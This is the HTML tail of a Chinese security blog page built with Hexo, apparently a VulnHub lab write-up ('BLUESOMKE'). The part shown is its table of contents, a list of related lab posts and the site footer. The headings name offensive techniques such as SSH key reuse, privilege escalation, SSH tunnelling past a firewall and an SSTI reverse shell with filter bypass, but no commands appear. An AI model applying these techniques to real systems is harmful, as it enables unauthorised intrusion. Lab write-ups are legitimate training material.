href="#%E6%88%91%E4%BB%AC%E5%B0%B1%E6%98%AF%E8%A6%81%E7%94%A8%E8%BF%99%E4%B8%AA%E7%A7%81%E9%92%A5%E6%96%87%E4%BB%B6%E5%88%86%E5%88%AB%E9%85%8D%E5%AF%B9%E5%9B%9B%E4%B8%AA%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%85%8D%E5%AF%86%E7%99%BB%E9%99%86"><span class="toc-number">5.</span> <span class="toc-text"> 我们就是要用这个私钥文件分别配对四个用户进行免密登陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%94%A8%E6%AD%A4%E7%A7%81%E9%92%A5%E7%99%BB%E9%99%86%E5%AF%B9%E6%96%B9%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E6%8F%90%E9%86%92%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81"><span class="toc-number">6.</span> <span class="toc-text"> 尝试用此私钥登陆对方服务器时，提醒我们需要输入密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004-%E7%94%A8%E6%88%B7%E7%BB%84%E6%9D%83%E9%99%90%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E6%8E%A8%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text"> 004 用户组权限利用，相关文件漏洞提权推理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%E5%BD%93%E5%89%8D%E6%9C%89%E5%93%AA%E4%BA%9B%E7%AB%AF%E5%8F%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B"><span class="toc-number">8.</span> <span class="toc-text"> 查看一下当前有哪些端口在运行，记录一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A4%E6%97%B6%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3-8787-%E6%88%90%E5%8A%9F%E8%A2%AB%E6%89%93%E5%BC%80%E4%BA%86"><span class="toc-number">9.</span> <span class="toc-text"> 此时本地端口 8787 成功被打开了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#005-ssh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99nohup%E6%97%A0%E6%97%A5%E5%BF%97%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8Cssh%E7%A9%BF%E9%80%8F"><span class="toc-number">10.</span> <span class="toc-text"> 005 ssh 端口转发绕防火墙，nohup 无日志后台运行，ssh 穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8E%E6%98%AF%E6%88%91%E4%BB%AC%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E7%9A%84-7001-%E7%AB%AF%E5%8F%A3%E4%BE%BF%E5%8F%AF%E4%BB%A5%E8%BF%9B%E5%85%A5%E5%88%B0%E5%85%AC%E7%BD%91%E4%B8%8A%E7%9A%84%E9%A1%B5%E9%9D%A2"><span class="toc-number">11.</span> <span class="toc-text"> 于是，我们访问本地的 7001 端口便可以进入到公网上的页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%87%E5%A6%82%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E5%9C%A8-9888-%E7%AB%AF%E5%8F%A3%E9%83%A8%E7%BD%B2%E4%BA%86%E4%B8%80%E4%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%86%E6%98%AF%E9%98%B2%E7%81%AB%E5%A2%99%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%BC%80%E6%94%BE%E8%BF%99%E4%B8%AA%E7%AB%AF%E5%8F%A3"><span class="toc-number">12.</span> <span class="toc-text"> 假如远程主机在 9888 端口部署了一个服务器，但是防火墙并没有开放这个端口，</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%9D%A5%E5%B0%86%E6%88%91%E4%BB%AC%E6%9C%AC%E5%9C%B0%E8%AE%BF%E9%97%AE-8787-%E7%AB%AF%E5%8F%A3%E6%97%B6%E8%BF%9B%E5%85%A5%E5%88%B0%E9%9D%B6%E6%9C%BA%E7%9A%84-8787-%E7%95%8C%E9%9D%A2%E4%BB%8E"><span class="toc-number">13.</span> <span class="toc-text"> 我们通过端口转发来将我们本地访问 8787 端口时进入到靶机的 8787 界面，从</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%8C%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E9%9D%B6%E6%9C%BA%E4%B8%8A%E9%9C%80%E8%A6%81%E7%A1%AE%E5%AE%9A%E5%BC%80%E6%94%BE%E4%BA%86-8787"><span class="toc-number">14.</span> <span class="toc-text"> 而绕过防火墙规则，靶机上需要确定开放了 8787</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#006-ssti%E5%8F%8D%E5%BC%B9shell%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">15.</span> <span class="toc-text"> 006 SSTI 反弹 shell，被过滤后的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80-1-270018787%E5%BC%80%E5%A7%8B%E6%B5%8B%E8%AF%95%E7%BD%91%E7%AB%99%E6%BC%8F%E6%B4%9E"><span class="toc-number">16.</span> <span class="toc-text"> 打开 1 27.0.0.1:8787 开始测试网站漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#007-awk%E9%85%8D%E5%90%88cut%E4%BD%BF%E7%94%A8vim%E4%B8%8D%E8%BF%9B%E5%85%A5%E5%86%99%E6%A8%A1%E5%BC%8F%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A7%A3%E5%AF%86"><span class="toc-number">17.</span> <span class="toc-text"> 007 awk 配合 cut 使用，vim 不进入写模式更改文件，二进制解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E7%8E%B0%E5%9C%A8%E4%BB%8D%E7%84%B6%E5%9C%A8%E4%B8%80%E4%B8%AA%E6%97%A2%E6%B2%A1%E6%9C%89%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%A5%E6%8F%90%E6%9D%83%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9B%B8%E5%85%B3%E6%9D%83%E9%99%90%E8%AE%BE%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="toc-number">18.</span> <span class="toc-text"> 我们现在仍然在一个既没有内核漏洞可以提权，也没有相关权限设置错误提权</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/07/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2023/07/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2023/07/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2023/07/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2023/07/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2023/07/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2023/07/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2023/07/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2023/07/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2023/07/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2023/07/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2023/07/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2023/07/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2023/07/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2023/07/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2023/07/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2023/07/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2023/07/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2023/07/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2023/07/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2023/07/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB RIPPER">VULNHUB RIPPER</a></li><li><a href="/2023/07/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB FUNBOX10">VULNHUB FUNBOX10</a></li><li><a href="/2023/07/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB KEYRING">VULNHUB KEYRING</a></li><li><a href="/2023/07/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></li><li><a href="/2023/07/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB SNAKEOIL">VULNHUB SNAKEOIL</a></li><li><a href="/2023/07/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB HACKERKID">VULNHUB HACKERKID</a></li><li><a href="/2023/07/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB TYPO">VULNHUB TYPO</a></li><li><a href="/2023/07/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB PRESIDENTIAL">VULNHUB PRESIDENTIAL</a></li><li><a href="/2023/07/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB BLUEMOON">VULNHUB BLUEMOON</a></li><li><a href="/2023/07/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB PROXIMACENTAURI">VULNHUB PROXIMACENTAURI</a></li><li><a href="/2023/07/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB JETTY">VULNHUB JETTY</a></li><li><a href="/2023/07/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB GROTESQUE2">VULNHUB GROTESQUE2</a></li><li><a href="/2023/07/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB GROTESQUE1">VULNHUB GROTESQUE1</a></li><li><a href="/2023/07/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB VENUS">VULNHUB VENUS</a></li><li class="active"><a href="/2023/07/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB BLUESOMKE">VULNHUB BLUESOMKE</a></li><li><a href="/2023/07/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB INFERNO">VULNHUB INFERNO</a></li><li><a href="/2023/07/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB LOOZ">VULNHUB LOOZ</a></li><li><a href="/2023/07/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB DARKHOLE2">VULNHUB DARKHOLE2</a></li><li><a href="/2023/07/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB ORASI">VULNHUB ORASI</a></li><li><a href="/2023/07/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB CEREAL">VULNHUB CEREAL</a></li><li><a href="/2023/07/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB TORANDO">VULNHUB TORANDO</a></li><li><a href="/2023/07/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB NEMESIS">VULNHUB NEMESIS</a></li><li><a href="/2023/07/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB GITROOT">VULNHUB GITROOT</a></li><li><a href="/2023/07/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB POWERGRID">VULNHUB POWERGRID</a></li><li><a href="/2023/07/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB DURIAN">VULNHUB DURIAN</a></li><li><a href="/2023/07/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB MOMENTUM2">VULNHUB MOMENTUM2</a></li><li><a href="/2023/07/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB GROTESQUE3">VULNHUB GROTESQUE3</a></li><li><a href="/2023/07/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB HACKABLE3">VULNHUB HACKABLE3</a></li><li><a href="/2023/07/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB CENGBOX3">VULNHUB CENGBOX3</a></li><li><a href="/2023/07/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB WARZONE3">VULNHUB WARZONE3</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt=".N1h1l157"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">.N1h1l157</p>
+  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">153</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">6</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">39</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
+      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/07/01/VULNHUB/139%20INFERNO/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/07/01/VULNHUB/137%20VENUS/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/ISFJ%E8%A7%A3%E8%AF%BB/" title="ISFJ解读">ISFJ解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/102%20NAPPING/" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/10%E3%80%8A%E6%91%86%E6%B8%A1%E4%BA%BA%E3%80%8B%E5%85%8B%E8%8E%B1%E5%B0%94%C2%B7%E9%BA%A6%E5%85%8B%E7%A6%8F%E5%B0%94/" title="《摆渡人》克莱尔·麦克福尔">《摆渡人》克莱尔·麦克福尔</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%B0%8F%E8%AF%B4/" title="分类于 小说">小说</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/31%E3%80%8A%E4%BA%BA%E7%94%9F%E3%80%8B%E8%B7%AF%E9%81%A5/" title="《人生》路遥">《人生》路遥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%B0%8F%E8%AF%B4/" title="分类于 小说">小说</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/6%E3%80%8A%E8%AE%BA%E4%B8%8A%E5%B8%9D%E7%9A%84%E9%9A%90%E7%A7%98%E3%80%8B%E5%BA%93%E6%92%92%C2%B7%E5%B0%BC%E5%8F%A4%E6%8B%89/" title="《论上帝的隐秘》库撒·尼古拉">《论上帝的隐秘》库撒·尼古拉</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%B0%8F%E8%AF%B4/" title="分类于 小说">小说</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/14%E3%80%8A%E4%B8%8E%E6%8A%91%E9%83%81%E7%97%87%E7%9B%B8%E4%BC%B4%E7%9A%84%E6%97%A5%E5%AD%90%E3%80%8B%E9%A9%AC%E4%BF%AE/" title="《与抑郁症相伴的日子》马修">《与抑郁症相伴的日子》马修</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/ESTP%E8%A7%A3%E8%AF%BB/" title="ESTP解读">ESTP解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/28%E3%80%8A%E5%BD%93%E5%91%BC%E5%90%B8%E5%8C%96%E4%B8%BA%E7%A9%BA%E6%B0%94%E3%80%8B%E4%BF%9D%E7%BD%97%C2%B7%E5%8D%A1%E6%8B%89%E5%B0%BC%E4%BB%80/" title="《当呼吸化为空气》保罗·卡拉尼什">《当呼吸化为空气》保罗·卡拉尼什</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/26%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/" title="《人类简史》尤瓦尔·赫拉利">《人类简史》尤瓦尔·赫拉利</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/INFJ%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/" title="INFJ深入分析">INFJ深入分析</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
+  </div>
+
+<!--   自定义开启一个网站的运行时间 -->
+  <div class="site-uptime">
+    Site uptime: <span id="site-uptime"></span>
+  </div>
+  <script>
+    var siteUptimeElement = document.getElementById('site-uptime');
+    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
+    setInterval(function() {
+      var currentTime = new Date();
+      var uptime = formatUptime(currentTime - siteSetupDate);
+      siteUptimeElement.textContent = uptime;
+    }, 1000);
+
+    function formatUptime(milliseconds) {
+      var seconds = Math.floor(milliseconds / 1000);
+      var minutes = Math.floor(seconds / 60);
+      var hours = Math.floor(minutes / 60);
+      var days = Math.floor(hours / 24);
+
+      var uptime = '';
+      if (days > 0) {
+        uptime += days + '天 ';
+      }
+      if (hours > 0) {
+        uptime += (hours % 24) + '时 ';
+      }
+      if (minutes > 0) {
+        uptime += (minutes % 60) + '分 ';
+      }
+      uptime += (seconds % 60) + '秒';
+
+      return uptime;
+    }
+  </script>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/07/01/VULNHUB/138 BLUESOMKE/',
+    favicon: {
+      show: "Cryp71c3",
+      hide: "十年磨一剑"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
